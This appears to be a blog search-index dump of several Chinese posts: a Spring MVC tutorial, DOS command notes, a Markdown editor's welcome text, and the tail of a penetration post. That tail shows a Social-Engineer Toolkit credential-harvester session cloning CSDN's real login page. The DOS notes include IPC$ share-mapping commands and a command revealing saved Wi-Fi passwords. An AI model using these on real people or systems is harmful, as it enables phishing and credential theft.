http://www.thisisafakesite.comset:webattack&gt; Enter the url to clone:https://passport.csdn.net/login[*] Cloning the website: https://passport.csdn.net/login[*] This could take a little bit...The best way to use this attack is if username and password formfields are available. Regardless, this captures all POSTs on a website.[*] You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.Press &#123;return&#125; if you understand what we're saying here.[*] The Social-Engineer Toolkit Credential Harvester Attack[*] Credential Harvester is running on port 80[*] Information will be displayed to you as it arrives below:directory traversal attempt detected from: 192.168.31.103192.168.31.103 - - [14/Dec/2018 19:08:55] \"GET /api/v4/search/preset_words HTTP/1.1\" 404 -192.168.31.103 - - [14/Dec/2018 19:08:58] \"GET / HTTP/1.1\" 200 - ------------------------------------------分割线------------------------------------------ 有点累了，后面的内容日后有时间再来更新吧。 2018-12-14,By Zero","path":"2018/12/14/渗透攻击/"},{"title":"Spring MVC的学习","text":"Spring MVC的学习1. Spring MVC环境搭建1.1 创建SpringMVCDemo项目并添加Spring支持1.2 修改applicationContext.xml文件在namespace中添加context和mvc，如此一来就支持了Spring MVC 123456&lt;context:annotation-config/&gt;&lt;context:component-scan base-package=\"com.tianxingjian\"/&gt;&lt;!-- 定义Spring MVC的处理 --&gt;&lt;mvc:annotation-driven/&gt;&lt;mvc:default-servlet-handler/&gt; 1.3 修改web.xml文件 最好的MVC设计，所有的控制器的处理依然是Servlet完成，而Spring MVC Servlet类：org.springframework.web.servlet.DispatcherServlet web.xml文件完整代码如下： 123456789101112131415161718192021222324252627&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;web-app xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd\" version=\"3.1\"&gt; &lt;display-name&gt;SpringMVCDemo&lt;/display-name&gt; &lt;!-- 此部分的操作是负责整个Spring容器启动的，即便使用了Spring MVC也不能缺少 --&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;!-- 配置Spring MVC之中要使用的控制器 --&gt; &lt;servlet&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;url-pattern&gt;*.action&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; 2. 实现Spring MVC程序2.1 建立Message.java和Type.java类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.tianxingjian.vo;import java.io.Serializable;import java.sql.Date;@SuppressWarnings(\"serial\")public class Message implements Serializable&#123; private Integer mid; private String title; private Double price; private Date date; private Type type; public Integer getMid() &#123; return mid; &#125; public void setMid(Integer mid) &#123; this.mid = mid; &#125; public String getTitle() &#123; return title; &#125; public void setTitle(String title) &#123; this.title = title; &#125; public Double getPrice() &#123; return price; &#125; public void setPrice(Double price) &#123; this.price = price; &#125; public Date getDate() &#123; return date; &#125; public void setDate(Date date) &#123; this.date = date; &#125; public Type getType() &#123; return type; &#125; public void setType(Type type) &#123; this.type = type; &#125; @Override public String toString() &#123; return \"Message [mid=\" + mid + \", title=\" + title + \", price=\" + price + \", date=\" + date + \", type=\" + type + \"]\"; &#125;&#125; 123456789101112131415161718package com.tianxingjian.vo;public class Type &#123; private String title; public String getTitle() &#123; return title; &#125; public void setTitle(String title) &#123; this.title = title; &#125; @Override public String toString() &#123; return \"Type [title=\" + title + \"]\"; &#125;&#125; 2.2 定义MessageAction.java12345678910111213141516package com.tianxingjian.action;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import com.tianxingjian.vo.Message;@Controller // 现在这里定义了控制器@Request Mapping(\"/pages/back/message/*\") // 整体的 访问路径public class MessageAction &#123; @RequestMapping(value=\"hello_demo\", method=RequestMethod.GET) // 为这个demo方法定义映射子路径以及请求类型 public void demo(Message msg) &#123; System.out.println(msg); &#125;&#125; 启动服务器之后访问路径：http://localhost:8080/SpringMVCDemo/pages/back/message/hello_demo.action?title=tianxingjian&amp;Type.title=LITAO即可见相应的输出 定义一个pages/forward.jsp文件 1234&lt;script type=\"text/javascript\"&gt; window.alert(\"$&#123;msg&#125;\"); window.location = \"&lt;%=basePath%&gt;$&#123;url&#125;\";&lt;/script&gt; 2.3 Spring MVC解析2.3.1 org.springframework.web.servlet.ModelAndView 如果现在由一个控制器跳转到forward.jsp页面，那么至少需要一下内容： 控制器需要知道forward.jsp的路劲 控制器需要传递若干个request属性 正因为很多的开发者都会面临同样的问题，所以在Spring MVC中有个类org.springframework.web.servlet.ModelAndView，这个类里含有以下几个操作方法： 构造方法：public ModelAndView(); 构造方法：public ModelAndView(String viewName), 跳转的路径地址 保存属性：public ModelAndView addObject(String attributeName, Object attributeValue) 修改MessageAction.java类来进行跳转功能： 12345678@RequestMapping(value=\"hello_demo\", method=RequestMethod.GET) // 为这个demo方法定义映射子路径以及请求类型 public ModelAndView demo(Message msg) &#123; ModelAndView mav = new ModelAndView(\"/pages/forward.jsp\"); mav.addObject(\"msg\", \"消息信息添加成功！\"); mav.addObject(\"url\", \"/index.jsp\"); System.out.println(msg); return mav; &#125; 通过以上，我们可以看到Spring MVC的优势： 避免了过于复杂的页面跳转路径的操作 避免了项目之中出现了过多的“.”作为参数的情况 2.3.2 内置对象 在Spring MVC里面，所有的操作都是以方法的形式出现的，但是如果说在开发里面需要使用到的内置对象只有ServletContext、HttpServletRequest、HttpServletResponse、HttpSession四个内置对象。而这四个内置对象实际上只有两个HttpServletRequest、HttpServletResponse 在MessageAction.java里面添加inner方法 123456789@RequestMapping(value=\"inner\") public ModelAndView inner(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; ServletContext application = request.getServletContext(); HttpSession session = request.getSession(); System.out.println(\"绝对路径:\" + application.getRealPath(\"/\")); System.out.println(\"session id：\" + session.getId()); response.getWriter().print(\"&lt;h1&gt;www.tianxingjian.com&lt;/h1&gt;\"); return null; &#125; 2.3.3 定义安全访问 在整个WEB项目里面WEB-INF目录是最安全的，但是如果按照原始的开发就会出现一个问题，每一个保存在WEB-INF目录下的JSP页面都需要编写一个映射，这样难度实在是太高了，所以在Spring里面考虑到了这类问题，提供了一个专门的类org.springframework.web.servlet.view.InternalResourceViewResolver，它需要在applicationContext.xml文件里面进行配置。 现在将保存在根目录下的pages目录直接保存在WEB-INF目录下。 配置applicationContext.xml文件： 1234&lt;bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\"&gt; &lt;property name=\"prefix\" value=\"/WEB-INF/pages\"/&gt; &lt;property name=\"suffix\" value=\".jsp\"/&gt;&lt;/bean&gt; 这样设置之后，在以后程序使用ModelAndView设置跳转路劲的时候就不再需要这些前缀和后缀了(/WEB-INF/pages和.jsp)，例如一下例子： 12345@RequestMapping(value=\"message_insertPre\") public ModelAndView insertPre() &#123; ModelAndView mav = new ModelAndView(\"/back/message/message_insert\"); return mav; &#125; 这样写之后，完整路径是/WEB-INF/pages/back/message/message_insertPre.jsp 2.3.4 资源文件 在Spring里面同样可以实现国际化的资源文件的读取。 建立两个文件Message_zh_CN.properties和Pages.properties文件 1info.msg=欢迎访问：&#123;0&#125; 1message.insert.action=/pages/back/message/message_action.action 如果我们要想实现资源文件的读取，则需要使用一个专门的资源文件读取类：org.springframework.context.support.ResourceBundleMssageSource 在applicationContext.xml文件里面配置资源文件的读取 12345678&lt;bean id=\"messageSource\" class=\"org.springframework.context.support.ResourceBundleMessageSource\"&gt; &lt;property name=\"basenames\"&gt; &lt;array&gt; &lt;value&gt;Message&lt;/value&gt; &lt;value&gt;Pages&lt;/value&gt; &lt;/array&gt; &lt;/property&gt;&lt;/bean&gt; 资源文件的访问核心永远是ResourceBundle类，所以访问的时候一定不要加上后缀并且不需要指定local数据。随后可以在需要它的Action上使用依赖注入的方式进行对象的设置。 在MessageAction.java里面注入Source对象： 12@Resourceprivate MessageSource messageSource; 随后在MessageAction.java里更改如下 1234567@RequestMapping(value=\"message_insertPre\") public ModelAndView insertPre() &#123; System.out.println(\"属性内容：\" + this.messageSource.getMessage(\"info.msg\", new Object [] &#123;\"www.tianxingjian.com\"&#125;, Locale.getDefault())); System.out.println(\"属性内容：\" + this.messageSource.getMessage(\"message.insert.action\", null, null)); ModelAndView mav = new ModelAndView(\"/pages/back/message/message_insert\"); return mav; &#125; 2.3.5 文件上传 在Spring MVC里面对于文件的上传操作依然使用了FileUpload组件（几乎所有的MVC开发框架都是用这个组件）。如果要想使用Spring MVC的文件上传，则需要使用org.springframework.web.multipart.commons.CommonsMultipartFile类来进行处理，这个类里含有如下方法： |- 取得上传文件的MIME类型：public String getContentType(); |- 判断是否有上传文件：public boolean isEmpty(); |- 取得上传文件的长度：public long getSize(); |- 取得上传文件的输入流：public InputStream getInputStream() throws IOException; 在applicationContext.xml文件里定义上传操作类 12345&lt;!-- 设置上传工具限制类 --&gt; &lt;bean id=\"multipartResolver\" class=\"org.springframework.web.multipart.commons.CommonsMultipartResolver\"&gt; &lt;property name=\"maxUploadSize\" value=\"5242880\"/&gt; &lt;!-- 上传文件的最大值 5M --&gt; &lt;property name=\"maxInMemorySize\" value=\"2097152\"/&gt; &lt;!-- 占用内存的最大值 2M --&gt; &lt;/bean&gt; 随后需要实现文件上传操作，在接受处理的方法上使用一个类即可： |- 接受上传文件：org.springframework.web.multipart.MultipartFile; 定义UploadAction.java实现文件的接受 12345678910111213@Controller@RequestMapping(\"/pages/*\")public class UploadAction &#123; @RequestMapping(value=\"insert\") public ModelAndView insert(Type type, MultipartFile pic) throws IOException &#123; System.out.println(\"类型名称：\" + type.getTitle()); System.out.println(\"文件类型：\" + pic.getContentType()); System.out.println(\"文件大小：\" + pic.getSize()); System.out.println(\"是否为空：\" + pic.isEmpty()); System.out.println(\"数据流：\" + pic.getInputStream()); return null; &#125;&#125; 定义表单type_insert.jsp实现文件上传 12345&lt;!-- 配置上传文件工具限制类--&gt;&lt;bean id=\"multipartResolver\" class=\"org.springframework.web.multipart.commons.CommonsMultipartResolver\"&gt; &lt;property name=\"maxUploadSize\" value=\"5242880\"/&gt; &lt;!-- 上传文件的最大值 5M --&gt; &lt;property name=\"maxInMemorySize\" value=\"2097152\"/&gt; &lt;!-- 占用内存的最大值 2M --&gt;&lt;/bean&gt; 这个时候可能会出现错误，只需要导入commons-io的jar包就行了。但是这里还有一个问题，就是如果上传的文件超出了设定的大小怎么办呢？我们可以由一下方法进行解决： 在applicationContext.xml文件处理错误信息 12345678910&lt;!-- 处理错误信息配置 --&gt;&lt;bean id=\"exceptionMapping\" class=\"org.springframework.web.portlet.handler.SimpleMappingExceptionResolver\"&gt; &lt;property name=\"exceptionMappings\"&gt; &lt;props&gt; &lt;prop key=\"org.springframework.web.multipart.MaxUploadSizeExceededException\"&gt; errors &lt;/prop&gt; &lt;/props&gt; &lt;/property&gt;&lt;/bean&gt; 2.在WEB-INF/pages下建立errors.jsp页面 123&lt;h1&gt; 对不起，程序出现错误，请按照规定重新访问！！！&lt;/h1&gt; 3.当访问的时候，如果上传的文件大小超出设定值，则会自动跳转到errors.jsp页面 2.3.5 拦截器 在Spring里面提供了一个专门的拦截器实现接口：org.springframework.web.servlet.HandlerInterceptor，在这里面提供如下三个方法： 操作执行前拦截：public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception; 操作执行时拦截：public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler ,ModelAndView modelAndView) throws Exception; 操作执行后拦截：public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception; 大部分情况下都会在preHandle()方法里进行拦截，因为拦截器主要处理的就是执行前的操作。 2.3.5.1 定义一个MyHandler.java类1234567891011121314151617181920212223242526272829package com.tianxingjian.interceptor;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.ModelAndView;public class MyHandler implements HandlerInterceptor &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception&#123; System.out.println(\"*********执行前拦截***********\"); return true; &#125; @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler , ModelAndView modelAndView) throws Exception &#123; System.out.println(\"*********执行时拦截***********\"); &#125; @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception&#123; System.out.println(\"*********执行处理完毕***********\"); &#125;&#125; 2.3.5.2 定义一个HelloAction.java类123456789101112131415package com.tianxingjian.action;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.servlet.ModelAndView;@Controller@RequestMapping(\"/pages/hello/*\")public class HelloAction &#123; @RequestMapping(value=\"insert\") public ModelAndView insert() throws Exception &#123; System.out.println(\"******hello world********\"); return null; &#125;&#125; 2.3.5.3 在applicationContext.xml里定义拦截器的使用1234567&lt;!-- 配置拦截器的使用 --&gt;&lt;mvc:interceptors&gt; &lt;mvc:interceptor&gt; &lt;mvc:mapping path=\"/pages/**/*.action\"/&gt; &lt;bean class=\"com.tianxingjian.interceptor.MyHandler\"/&gt; &lt;/mvc:interceptor&gt;&lt;/mvc:interceptors&gt; 此处表示对pages下的所有的*.action进行拦截。在整个拦截器的处理过程中，将处理的步骤拆分的非常的细，拦截器重点操作是在preHandler方法下，如果返回true则继续向下执行，返会false则不执行后续操作。启动tomcat后访问/pages/hello/insert.action可见拦截结果。 而preHandler最主要是在Object参数下，Object即org.springframework.web.method.HandlerMethod，在整个类里面有如下一些操作： 触发拦截器的程序类(Action)：public Object getBean(); 取得处理的方法：public Method getMethod(); 取得方法的参数数据：public MethodParameter[] getMethodParameters();|- 取得方法：public Method getMethod();|- 取得参数名称：public String getParameterName();|- 取得参数类型：public Class&lt;?&gt; getParameterType(); 2.4 利用Spring MVC实现CRUD2.4.1 定义IMessageService.java业务层接口123456789101112131415package com.tianxingjian.service;import java.util.Map;import java.util.Set;import com.tianxingjian.vo.Message;public interface IMessageService &#123; public boolean insert(Message vo) throws Exception; public boolean update(Message vo) throws Exception; public boolean delete(Set&lt;Integer&gt; ids) throws Exception; public Message get(int id) throws Exception; public Map&lt;String, Object&gt; list(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception;&#125; 2.4.2 定义接口的实现类MessageServiceImpl.java1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package com.tianxingjian.service.impl;import java.util.ArrayList;import java.util.Date;import java.util.HashMap;import java.util.List;import java.util.Map;import java.util.Set;import org.springframework.stereotype.Service;import com.tianxingjian.service.IMessageService;import com.tianxingjian.vo.Message;import com.tianxingjian.vo.Type;@Servicepublic class MessageServiceImpl implements IMessageService&#123; @Override public boolean insert(Message vo) throws Exception &#123; System.out.println(\"*******添加信息*******\" + vo); return false; &#125; @Override public boolean update(Message vo) throws Exception &#123; System.out.println(\"*******修改信息*******\" + vo); return false; &#125; @Override public boolean delete(Set&lt;Integer&gt; ids) throws Exception &#123; System.out.println(\"*******删除信息系*******\" + ids); return false; &#125; @Override public Message get(int id) throws Exception &#123; System.out.println(\"*******根据id查询数据*******\" + id); Message msg = new Message(); msg.setMid(10); msg.setDate(new Date()); msg.setPrice(1000.1); msg.setTitle(\"title\"); Type type = new Type(); type.setTitle(\"new title!\"); msg.setType(type); return msg; &#125; @Override public Map&lt;String, Object&gt; list(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception &#123; Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;(); List&lt;Message&gt; all = new ArrayList&lt;Message&gt;(); for (int x=(currentPage-1)*lineSize;x&lt;currentPage*lineSize; x++) &#123; Message msg = new Message(); msg.setMid(100 + x); msg.setDate(new Date()); msg.setPrice(1000.1 + x); msg.setTitle(\"title\" + x); Type type = new Type(); type.setTitle(\"new title!\" + x); msg.setType(type); all.add(msg); &#125; map.put(\"allMsg\", all); map.put(\"msgCount\", 8888); return map; &#125;&#125; 2.4.3 修改MessageAction.java类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091package com.tianxingjian.action;import java.text.SimpleDateFormat;import java.util.Date;import java.util.HashSet;import java.util.Set;import javax.annotation.Resource;import org.springframework.beans.propertyeditors.CustomDateEditor;import org.springframework.stereotype.Controller;import org.springframework.web.bind.WebDataBinder;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.servlet.ModelAndView;import com.tianxingjian.service.IMessageService;import com.tianxingjian.vo.Message;@Controller // 现在这里定义了控制器@RequestMapping(\"/pages/back/message/*\") // 整体的 访问路径public class MessageAction &#123; @Resource private IMessageService messageService; @RequestMapping(value=\"message_insert\") public ModelAndView insert(Message msg) throws Exception &#123; ModelAndView mav = new ModelAndView(\"/pages/forward.jsp\"); System.out.println(this.messageService.insert(msg)); mav.addObject(\"msg\", \"消息添加成功\"); mav.addObject(\"url\", \"/pages/back/message/message_insert.jsp\"); return mav; &#125; @RequestMapping(value=\"message_update\") public ModelAndView update(Message msg) throws Exception &#123; ModelAndView mav = new ModelAndView(\"/pages/forward.jsp\"); System.out.println(this.messageService.update(msg)); mav.addObject(\"msg\", \"消息更新成功\"); mav.addObject(\"url\", \"/index.jsp\"); return mav; &#125; @RequestMapping(value=\"message_delete\") public ModelAndView delete(String ids) throws Exception &#123; ModelAndView mav = new ModelAndView(\"/pages/forward.jsp\"); Set&lt;Integer&gt; set = new HashSet&lt;Integer&gt;(); String result [] = ids.split(\"_\"); for (int x=0; x&lt;result.length; x++) &#123; set.add(Integer.parseInt(result[x])); &#125; System.out.println(this.messageService.delete(set)); mav.addObject(\"msg\", \"消息删除成功\"); mav.addObject(\"url\", \"/index.jsp\"); return mav; &#125; @RequestMapping(value=\"message_get\") public ModelAndView get(Integer id) throws Exception &#123; ModelAndView mav = new ModelAndView(\"/pages/forward.jsp\"); System.out.println(this.messageService.get(id)); mav.addObject(\"msg\", \"消息查询成功\"); mav.addObject(\"url\", \"/index.jsp\"); return mav; &#125; @RequestMapping(value=\"message_list\") public ModelAndView list(String column, String keyWord, int currentPage, int lineSize) throws Exception &#123; ModelAndView mav = new ModelAndView(\"/pages/forward.jsp\"); System.out.println(this.messageService.list(column, keyWord, currentPage, lineSize)); mav.addObject(\"msg\", \"消息查询所有成功\"); mav.addObject(\"url\", \"/index.jsp\"); return mav; &#125; @InitBinder public void initBinder(WebDataBinder binder) &#123; SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd\"); // 注册一个专门的日期转换器的操作类，并且允许输入的数据为空 binder.registerCustomEditor(Date.class, new CustomDateEditor(sdf, true)); &#125; // @RequestMapping(value=\"hello_demo\", method=RequestMethod.GET) // 为这个demo方法定义映射子路径以及请求类型// public ModelAndView demo(Message msg) &#123;// ModelAndView mav = new ModelAndView(\"/pages/forward.jsp\");// mav.addObject(\"msg\", \"消息信息添加成功！\");// mav.addObject(\"url\", \"/index.jsp\");// System.out.println(msg);// return mav;// &#125;&#125;&#125; 2.4.4 定义/pages/back/message/message_insert.jsp和message_update页面123456789&lt;form action=\"pages/back/message/message_insert.action\" method=\"post\"&gt; 消息编号：&lt;input type=\"text\" id=\"mid\" name=\"mid\" value=\"46546\"/&gt;&lt;br/&gt; 消息名称：&lt;input type=\"text\" id=\"title\" name=\"title\" value=\"lt\"/&gt;&lt;br/&gt; 消息价格：&lt;input type=\"text\" id=\"price\" name=\"price\" value=\"453.4534\"/&gt;&lt;br/&gt; 消息日期：&lt;input type=\"text\" id=\"date\" name=\"date\" value=\"2014-11-11\"/&gt;&lt;br/&gt; 消息类型：&lt;input type=\"text\" id=\"type.title\" name=\"type.title\" value=\"今日热点\"/&gt;&lt;br/&gt; &lt;input type=\"submit\" value=\"提交\"/&gt; &lt;input type=\"reset\", value=\"重置\"/&gt;&lt;/form&gt; 123456789&lt;form action=\"pages/back/message/message_update.action\" method=\"post\"&gt; 消息编号：&lt;input type=\"text\" id=\"mid\" name=\"mid\" value=\"98\"/&gt; 消息名称：&lt;input type=\"text\" id=\"title\" name=\"title\" value=\"tianxingjian\"/&gt; 消息价格：&lt;input type=\"text\" id=\"price\" name=\"price\" value=\"9999.999\"/&gt; 消息日期：&lt;input type=\"text\" id=\"date\" name=\"date\" value=\"1111-11-11\"/&gt; 消息类型：&lt;input type=\"text\" id=\"type.title\" name=\"type.title\" value=\"新闻头条\"/&gt; &lt;input type=\"submit\" value=\"提交\"/&gt; &lt;input type=\"reset\", value=\"重置\"/&gt;&lt;/form&gt; 2.4.5 解决乱码问题解决乱码问题一般有两种方法： 方式一：建立一个过滤器 方式二：使用spring的专属过滤器 这里使用方式二： 在web.xml文件里配置过滤器 12345678910111213&lt;!-- 添加Spring编码过滤器配置 --&gt;&lt;filter&gt; &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;/param-name&gt; &lt;param-value&gt;UTF-8&lt;/param-value&gt; &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;encodingfilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;","path":"2018/12/03/Spring MVC的学习/"},{"title":"DOS命令","text":"一、文件基本操作 dir展示文件夹中的文件dir c:\\ tree 展示文件树 md 创建文件夹md e:\\test copy 复制文件copy it e:\\test xcopy 复制文件和文件夹xcopy it del 删除文件del /q e:\\test rename 重命名rename test.txt demo.txt move 移动文件夹move d:\\demo.txt d:\\ replace 替换文件replace /? 查看使用方法 type 查看文件内容type test.txt cd 切换目录 二、基本操作set、if、exist、equ、gtr、geq、lss、…… setx 设置永久变量setx PATH “%path%;d:” 将d盘加到环境变量 三、临时提升管理员权限runas /?runas /noprofile /user:mymachine/administrantor cmdmymachine:hostname 四、net use建立空连接：net use \\\\IP\\ipc$ “” /user:”” 建立非空连接：net use \\\\IP\\ipc$ “用户名” /user:”密码” 映射默认共享：将对方的c盘映射到自己的z盘：net use z:\\\\IP\\c$ “密码” /user:”用户名” 如果已经建立起ipc$，则可以直接用IP+盘符+$访问：具体命令：net use z: \\\\IP\\c$ 删除一个ipc$连接： net use \\\\IP\\ipc$ /del 删除共享映射：net use c: /del 删除映射的c盘 五、netsh修改windows 的ip、网关、dns等信息 备份网络配置：netsh dump &gt; 路径（将自己的网络配置信息下载下来，例如 netsh dump &gt; c:/info.txt）设置静态ip：1. netsh进入 2.set address name=”WLAN” source=static addr=”196.168.163.1” mask=”255.255.255.1” 查看当前系统已经保存的网络：netsh wlan show profiles 查看指定的wifi密码：netsh wlan show profile name=”xiaomi” key=clear 六、netstat七、net查看共享：net share共享C盘：net share f=C:/取消共享：net share f /delete查看局域网内其他计算机：net view开启服务：net start “Computer Browser”关闭服务：net stop “Computer Browser” 八、telnettelnet用于查看端口是否可访问。打开telnet功能：控制面板-程序-启用或关闭功能-√telnet检测端口是否开放：telnet www.baidu.com 80 九、查看操作系统操作系统信息：winver查看激活信息：slmgr /dli || slmgr /xpr查看产品密钥：slmgr /upk安装产品密钥：slmgr /ipk XXXXXXXXXX成功的激活产品：slmgr /ato 十、ipconfig提高网速：1. ipconfig /flushdns 十一、死亡之ping查看用法：ping /?向百度发送数据包：ping www.baidu.com","path":"2018/11/13/DOS命令/"},{"title":"欢迎使用 Cmd Markdown 编辑阅读器","text":"我们理解您需要更便捷更高效的工具记录思想，整理笔记、知识，并将其中承载的价值传播给他人，Cmd Markdown 是我们给出的答案 —— 我们为记录思想和分享知识提供更专业的工具。 您可以使用 Cmd Markdown： 整理知识，学习笔记 发布日记，杂文，所见所想 撰写发布技术文稿（代码支持） 撰写发布学术论文（LaTeX 公式支持） 除了您现在看到的这个 Cmd Markdown 在线版本，您还可以前往以下网址下载： Windows/Mac/Linux 全平台客户端 请保留此份 Cmd Markdown 的欢迎稿兼使用说明，如需撰写新稿件，点击顶部工具栏右侧的 新文稿 或者使用快捷键 Ctrl+Alt+N。 什么是 MarkdownMarkdown 是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档：譬如您正在阅读的这份文档。它使用简单的符号标记不同的标题，分割不同的段落，粗体 或者 斜体 某些文字，更棒的是，它还可以 1. 制作一份待办事宜 Todo 列表 [ ] 支持以 PDF 格式导出文稿 [ ] 改进 Cmd 渲染算法，使用局部渲染技术提高渲染效率 [x] 新增 Todo 列表功能 [x] 修复 LaTex 公式渲染问题 [x] 新增 LaTex 公式编号功能 2. 书写一个质能守恒公式LaTeXE=mc^23. 高亮一段代码code1234567@requires_authorizationclass SomeClass: passif __name__ == '__main__': # A comment print 'hello world' 4. 高效绘制 流程图12345678st=&gt;start: Startop=&gt;operation: Your Operationcond=&gt;condition: Yes or No?e=&gt;endst-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op 5. 高效绘制 序列图123Alice-&gt;Bob: Hello Bob, how are you?Note right of Bob: Bob thinksBob--&gt;Alice: I am good thanks! 6. 高效绘制 甘特图12345678910111213title 项目开发流程section 项目确定 需求分析 :a1, 2016-06-22, 3d 可行性报告 :after a1, 5d 概念验证 : 5dsection 项目实施 概要设计 :2016-07-05 , 5d 详细设计 :2016-07-08, 10d 编码 :2016-07-15, 10d 测试 :2016-07-22, 5dsection 发布验收 发布: 2d 验收: 3d 7. 绘制表格 项目 价格 数量 计算机 \\$1600 5 手机 \\$12 12 管线 \\$1 234 8. 更详细语法说明想要查看更详细的语法说明，可以参考我们准备的 Cmd Markdown 简明语法手册，进阶用户可以参考 Cmd Markdown 高阶语法手册 了解更多高级功能。 总而言之，不同于其它 所见即所得 的编辑器：你只需使用键盘专注于书写文本内容，就可以生成印刷级的排版格式，省却在键盘和工具栏之间来回切换，调整内容和格式的麻烦。Markdown 在流畅的书写和印刷级的阅读体验之间找到了平衡。 目前它已经成为世界上最大的技术分享网站 GitHub 和 技术问答网站 StackOverFlow 的御用书写格式。 什么是 Cmd Markdown您可以使用很多工具书写 Markdown，但是 Cmd Markdown 是这个星球上我们已知的、最好的 Markdown 工具——没有之一 ：）因为深信文字的力量，所以我们和你一样，对流畅书写，分享思想和知识，以及阅读体验有极致的追求，我们把对于这些诉求的回应整合在 Cmd Markdown，并且一次，两次，三次，乃至无数次地提升这个工具的体验，最终将它演化成一个 编辑/发布/阅读 Markdown 的在线平台——您可以在任何地方，任何系统/设备上管理这里的文字。 1. 实时同步预览我们将 Cmd Markdown 的主界面一分为二，左边为编辑区，右边为预览区，在编辑区的操作会实时地渲染到预览区方便查看最终的版面效果，并且如果你在其中一个区拖动滚动条，我们有一个巧妙的算法把另一个区的滚动条同步到等价的位置，超酷！ 2. 编辑工具栏也许您还是一个 Markdown 语法的新手，在您完全熟悉它之前，我们在 编辑区 的顶部放置了一个如下图所示的工具栏，您可以使用鼠标在工具栏上调整格式，不过我们仍旧鼓励你使用键盘标记格式，提高书写的流畅度。 3. 编辑模式完全心无旁骛的方式编辑文字：点击 编辑工具栏 最右侧的拉伸按钮或者按下 Ctrl + M，将 Cmd Markdown 切换到独立的编辑模式，这是一个极度简洁的写作环境，所有可能会引起分心的元素都已经被挪除，超清爽！ 4. 实时的云端文稿为了保障数据安全，Cmd Markdown 会将您每一次击键的内容保存至云端，同时在 编辑工具栏 的最右侧提示 已保存 的字样。无需担心浏览器崩溃，机器掉电或者地震，海啸——在编辑的过程中随时关闭浏览器或者机器，下一次回到 Cmd Markdown 的时候继续写作。 5. 离线模式在网络环境不稳定的情况下记录文字一样很安全！在您写作的时候，如果电脑突然失去网络连接，Cmd Markdown 会智能切换至离线模式，将您后续键入的文字保存在本地，直到网络恢复再将他们传送至云端，即使在网络恢复前关闭浏览器或者电脑，一样没有问题，等到下次开启 Cmd Markdown 的时候，她会提醒您将离线保存的文字传送至云端。简而言之，我们尽最大的努力保障您文字的安全。 6. 管理工具栏为了便于管理您的文稿，在 预览区 的顶部放置了如下所示的 管理工具栏： 通过管理工具栏可以： &lt;/i&gt; 发布：将当前的文稿生成固定链接，在网络上发布，分享 新建：开始撰写一篇新的文稿&lt;/i&gt; 删除：删除当前的文稿 导出：将当前的文稿转化为 Markdown 文本或者 Html 格式，并导出到本地&lt;/i&gt; 列表：所有新增和过往的文稿都可以在这里查看、操作 模式：切换 普通/Vim/Emacs 编辑模式 7. 阅读工具栏 通过 预览区 右上角的 阅读工具栏，可以查看当前文稿的目录并增强阅读体验。 工具栏上的五个图标依次为： &lt;/i&gt; 目录：快速导航当前文稿的目录结构以跳转到感兴趣的段落 视图：互换左边编辑区和右边预览区的位置&lt;/i&gt; 主题：内置了黑白两种模式的主题，试试 黑色主题，超炫！ 阅读：心无旁骛的阅读模式提供超一流的阅读体验 全屏：简洁，简洁，再简洁，一个完全沉浸式的写作和阅读环境 8. 阅读模式在 阅读工具栏 点击 或者按下 Ctrl+Alt+M 随即进入独立的阅读模式界面，我们在版面渲染上的每一个细节：字体，字号，行间距，前背景色都倾注了大量的时间，努力提升阅读的体验和品质。 9. 